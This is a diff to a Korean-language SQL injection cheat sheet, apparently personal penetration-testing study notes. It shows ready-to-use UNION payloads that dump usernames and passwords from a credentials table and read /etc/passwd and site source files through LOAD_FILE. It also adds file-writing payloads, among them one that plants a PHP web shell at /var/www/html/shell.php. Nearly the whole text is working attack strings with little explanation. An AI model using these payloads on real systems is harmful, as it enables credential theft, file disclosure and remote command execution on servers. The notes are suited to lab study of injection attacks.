@@ -283,7 +283,7 @@ cn' UNION select 1,2,3,4-- -
 ### Data
 ```cn' UNION select 1, username, password, 4 from dev.credentials-- -```
 
-## 4. 파일 읽기
+## 5. 파일 읽기
 
 ### DB User
 ```cn' UNION SELECT 1, user(), 3, 4-- -```<br/>
@@ -303,10 +303,20 @@ cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 ```
 
+## 6. 파일 쓰기
 
+### 파일 쓰기 권한 (secure_file_priv값 확인)
+```cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -```
 
+### SELECT INTO OUTFILE
+```
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
 
+### SQL Injection을 통한 파일 쓰기
+```cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -```
 
-
-
+### Writing a Web Shell
+```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -```
 
